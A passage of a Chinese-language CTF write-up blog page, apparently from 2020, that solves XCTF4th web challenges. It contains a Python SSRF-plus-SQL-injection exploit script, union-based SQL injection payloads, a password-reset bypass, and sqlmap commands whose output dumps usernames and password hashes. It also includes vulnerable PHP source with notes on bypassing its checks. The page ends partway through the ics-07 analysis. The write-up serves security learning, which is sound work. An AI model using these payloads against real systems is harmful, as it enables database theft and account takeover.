@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XCTF4th | Rick</title><meta name="author" content="LYC"><meta name="copyright" content="LYC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ics-02 扫描有secret目录， 无法直接进入secret_debug.php 显示ip不对 点paper会向download.php传参,可以下载一个ssrf内容的pdf, 于是想到利用ssrf来访问secret_debug.php  发现参数s,fuzz一下,发现s&#x3D;3时会有如下返回 输入这么多个字段注册。注册成功后会把其中一部分字段返回，猜测后台逻辑应该是: 1234567INSERT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF4th">
+<meta property="og:url" content="http://991688344.github.io/2020/03/19/XCTF4th-CyberEarth/index.html">
+<meta property="og:site_name" content="Rick">
+<meta property="og:description" content="ics-02 扫描有secret目录， 无法直接进入secret_debug.php 显示ip不对 点paper会向download.php传参,可以下载一个ssrf内容的pdf, 于是想到利用ssrf来访问secret_debug.php  发现参数s,fuzz一下,发现s&#x3D;3时会有如下返回 输入这么多个字段注册。注册成功后会把其中一部分字段返回，猜测后台逻辑应该是: 1234567INSERT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://991688344.github.io/images/Wallpaper/eatham.gif">
+<meta property="article:published_time" content="2020-03-18T19:40:58.000Z">
+<meta property="article:modified_time" content="2024-03-19T01:32:36.463Z">
+<meta property="article:author" content="LYC">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://991688344.github.io/images/Wallpaper/eatham.gif"><link rel="shortcut icon" href="/images/Wallpaper/favicon.ico"><link rel="canonical" href="http://991688344.github.io/2020/03/19/XCTF4th-CyberEarth/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/content.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XCTF4th',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/mycss/my_background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #F7F9FE;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/Wallpaper/eatham.gif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rick</span></a><a class="nav-page-title" href="/"><span class="site-name">XCTF4th</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XCTF4th</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-18T19:40:58.000Z" title="发表于 2020-03-19 03:40:58">2020-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T01:32:36.463Z" title="更新于 2024-03-19 09:32:36">2024-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>ics-02</h1>
+<p>扫描有secret目录，</p>
+<p>无法直接进入secret_debug.php 显示ip不对<br>
+点paper会向download.php传参,可以下载一个ssrf内容的pdf,<br>
+于是想到利用ssrf来访问secret_debug.php<br>
+<img src="https://img-blog.csdnimg.cn/20190929212015411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODg0NzI3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
+发现参数s,fuzz一下,发现s=3时会有如下返回</p>
+<p>输入这么多个字段注册。注册成功后会把其中一部分字段返回，猜测后台逻辑应该是:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Persons <span class="keyword">VALUES</span> ($textfirst_name, </span><br><span class="line">                            $textmiddle_name, </span><br><span class="line">                            $texLast_name, </span><br><span class="line">                            $textname_suffix,</span><br><span class="line">                           	$textdob,</span><br><span class="line">                           	$textdl_nmber,</span><br><span class="line">                           	$textRetypeDL)</span><br></pre></td></tr></table></figure>
+<p>注册后，将<code>txtfirst_name  $textast_name  $txtdob</code>,显示出来，注入思路就是注释掉中间一部分字段就好了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;txtfirst_name&quot;: &quot;L&#x27;,&#x27;1&#x27;,(&quot;<span class="operator">+</span>subquery<span class="operator">+</span>&quot;),&#x27;1&#x27;/*&quot;,</span><br><span class="line">&quot;txtmiddle_name&quot;: &quot;m&quot;,</span><br><span class="line">&quot;txtLast_name&quot;: &quot;y&quot;,</span><br><span class="line">&quot;txtname_suffix&quot;: &quot;Esq.&quot;,</span><br><span class="line">&quot;txtdob&quot;: &quot;*/,&#x27;01/10/2019&quot;,</span><br><span class="line">&quot;txtdl_nmbr&quot;: id,</span><br><span class="line">&quot;txtRetypeDL&quot;: id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Persons <span class="keyword">VALUES</span> (&quot;L&#x27;,&#x27;1&#x27;,(&quot;<span class="operator">+</span>payload<span class="operator">+</span>&quot;),&#x27;1&#x27;/*&quot;,&quot;m&quot;,&quot;y&quot;,&quot;Esq.&quot;,&quot;*/,&#x27;01/10/2019&quot;,id,id)</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://111.198.29.45:52536/download.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># subquery = &quot;database()&quot;</span></span><br><span class="line"><span class="comment"># ssrfw</span></span><br><span class="line"><span class="comment"># subquery = &quot;select table_name from information_schema.tables where table_schema=&#x27;ssrfw&#x27; LIMIT 1&quot;</span></span><br><span class="line"><span class="comment"># cetcYssrf</span></span><br><span class="line"><span class="comment"># subquery = &quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; LIMIT 1&quot;</span></span><br><span class="line"><span class="comment"># secretname -&gt; flag</span></span><br><span class="line"><span class="comment"># subquery = &quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; LIMIT 1, 1&quot;</span></span><br><span class="line"><span class="comment"># value -&gt; flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;</span></span><br><span class="line">subquery = <span class="string">&quot;select value from cetcYssrf LIMIT 1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = random.randint(<span class="number">1</span>, <span class="number">10000000</span>)</span><br><span class="line"></span><br><span class="line">d = (<span class="string">&#x27;http://127.0.0.1/secret/secret_debug.php?&#x27;</span> +</span><br><span class="line">        urllib.parse.urlencode(&#123;</span><br><span class="line">            <span class="string">&quot;s&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txtfirst_name&quot;</span>: <span class="string">&quot;L&#x27;,&#x27;1&#x27;,(&quot;</span>+subquery+<span class="string">&quot;),&#x27;1&#x27;/*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txtmiddle_name&quot;</span>: <span class="string">&quot;m&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txtLast_name&quot;</span>: <span class="string">&quot;y&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txtname_suffix&quot;</span>: <span class="string">&quot;Esq.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txtdob&quot;</span>: <span class="string">&quot;*/,&#x27;01/10/2019&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txtdl_nmbr&quot;</span>: <span class="built_in">id</span>,</span><br><span class="line">            <span class="string">&quot;txtRetypeDL&quot;</span>: <span class="built_in">id</span></span><br><span class="line">            &#125;) + <span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;<span class="string">&quot;dl&quot;</span>: d&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<h1>ics-04</h1>
+<p>注册用户，登录，修改密码</p>
+<p>在这几个页面<code>fuzz</code>，发现<code>login</code>页面输入什么都可以登录然后显示<code>普通用户登录没啥用</code>，应该就是个提示而已</p>
+<p>继续<code>fuzz</code>发现找回密码处存在注入</p>
+<p><img src="/2020/03/19/XCTF4th-CyberEarth/image-20200319034650710.png" alt="image-20200319034650710"></p>
+<ul>
+<li>输入<code>1' or 1=1#</code>,进入密码修改页面</li>
+<li>输入<code>1' or 1=0#</code>，提示没有此用户</li>
+</ul>
+<p>可以推断出这里是<code>bool</code>盲注，且<code>fuzz</code>时没有发现有什么过滤</p>
+<h2 id="手动">手动</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">order by测试发现有四个字段</span><br><span class="line">1&#x27; or 1=1 order by 4#</span><br><span class="line"></span><br><span class="line">找出所有的数据库</span><br><span class="line">&#x27; union select 1,2,group_concat(schema_name),4 from information_schema.schemata;#</span><br><span class="line">information_schema, : cetc004, : mysql, : performance_schema</span><br><span class="line"></span><br><span class="line">爆cetc004数据库</span><br><span class="line">&#x27; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=&#x27;cetc004&#x27; and table_name=&#x27;user&#x27;;#</span><br><span class="line">: username, : password, : question, : answer</span><br><span class="line"></span><br><span class="line">找用户名密码</span><br><span class="line">&#x27; union select 1,2,group_concat(username),4 from cetc004.user;#</span><br><span class="line">c3tlwDmIn23,c3tlwDmIn23</span><br><span class="line">&#x27; union select 1,2,group_concat(password),4 from cetc004.user;#</span><br><span class="line">2f8667f381ff50ced6a3edc259260ba9,21232f297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure>
+<p>密码是被<code>hash</code>过的，但是注册页面可以注册同名用户，注册一个这个名字 登录就好了</p>
+<p>通过观察重置密码的http请求，发现总共是3个请求，而且不同用户名的cookie是不变的，猜测使用会话实现重置密码的功能，而会话是与用户名绑定的，因此我们可以构造一个SQL语句，使得查询出来的用户名是管理员的用户名，但是密保问题和答案是我们自己指定的，就可以成功重置密码了：<code>' union select 'c3tlwDmIn23','202cb962ac59075b964b07152d234b70','随意设置的问题','answer123333';#</code></p>
+<h2 id="sqlmap跑">sqlmap跑</h2>
+<p><img src="/2020/03/19/XCTF4th-CyberEarth/image-20200319042007939.png" alt="image-20200319042007939"></p>
+<p><img src="/2020/03/19/XCTF4th-CyberEarth/image-20200319042048130.png" alt="image-20200319042048130"></p>
+<p>sqlmap跑的是时间盲注入，可能慢一点</p>
+<p><code>sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=1&#x27; AND (SELECT 5762 FROM (SELECT(SLEEP(5)))yWIL) AND &#x27;ENSj&#x27;=&#x27;ENSj</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: username=1&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a7a71,0x6c696648426256635a6c48454d56585870536a777351674553657047484f6c665654436558636557,0x7178787171),NULL-- qBMW</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<p><code>sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; --dbs</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:                                                                       </span><br><span class="line">[*] cetc004</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure>
+<p><code>sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 --tables</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[1 table]</span><br><span class="line">+------+</span><br><span class="line">| user |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
+<p><code>sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user --columns</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: cetc004                                                                              </span><br><span class="line">Table: user</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| answer   | varchar(255) |</span><br><span class="line">| password | varchar(255) |</span><br><span class="line">| question | varchar(255) |</span><br><span class="line">| username | varchar(255) |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure>
+<p><code>sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user -C &quot;username,password&quot; --dump</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: cetc004</span><br><span class="line">Table: user</span><br><span class="line">[1 entry]</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| username    | password                         |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| c3tlwDmIn23 | 2f8667f381ff50ced6a3edc259260ba9 |</span><br><span class="line">+-------------+----------------------------------+</span><br></pre></td></tr></table></figure>
+<p>被hash加密了,发现注册页面可以再次注册c3tlwDmIn23这个账号,成功重置密码,登入得到flag</p>
+<p>加上–technique=T -v 3 就先看看sqlmap检测payload。</p>
+<h1>ics-07</h1>
+<p>在<code>项目管理</code>中有源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    if (!isset($_GET[page])) &#123;</span><br><span class="line">      show_source(__FILE__);</span><br><span class="line">      die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#x27;index.php&#x27;) &#123;</span><br><span class="line">      include(&#x27;flag.php&#x27;);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">      header(&#x27;Location: ?page=flag.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt;</span><br><span class="line">      page : &lt;input type=&quot;text&quot; name=&quot;page&quot; value=&quot;&quot;&gt;</span><br><span class="line">      id : &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=&quot;index.phps&quot;&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">     if ($_SESSION[&#x27;admin&#x27;]) &#123;</span><br><span class="line">       $con = $_POST[&#x27;con&#x27;];</span><br><span class="line">       $file = $_POST[&#x27;file&#x27;];</span><br><span class="line">       $filename = &quot;backup/&quot;.$file;</span><br><span class="line"></span><br><span class="line">       if(preg_match(&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123;</span><br><span class="line">          die(&quot;Bad file extension&quot;);</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">            chdir(&#x27;uploaded&#x27;);</span><br><span class="line">           $f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">      if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123;</span><br><span class="line">        include &#x27;config.php&#x27;;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $result = False;</span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);</span><br><span class="line">      if($result)&#123;</span><br><span class="line">        echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        $_SESSION[&#x27;admin&#x27;] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p>审计第二部分php感觉应该数据库中只有一个<code>id=1</code>的数据，但是不能直接输入1,要绕过这个限制<code>if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9')</code>:</p>
+<ul>
+<li>
+<p>``floatval($_GET[id]) !== ‘1’<code>,这个函数只截取数字部分，例如</code>floatval(“123zxc”) = 123`</p>
+</li>
+<li>
+<p><code>mysql</code>中存在隐式数据转换，例如<code>1==&quot;1asd&quot;</code></p>
+<p>构造<code>id=1xx9&amp;page=flag.php</code>,即可在数据库查询到<code>id=1</code>的数据</p>
+</li>
+</ul>
+</li>
+<li>
+<p>审计第一部分文件上传的地方，这里需要注意的3个点:</p>
+<ol>
+<li><code>$filename = &quot;backup/&quot;.$file;</code>目录为假目录，需要绕过</li>
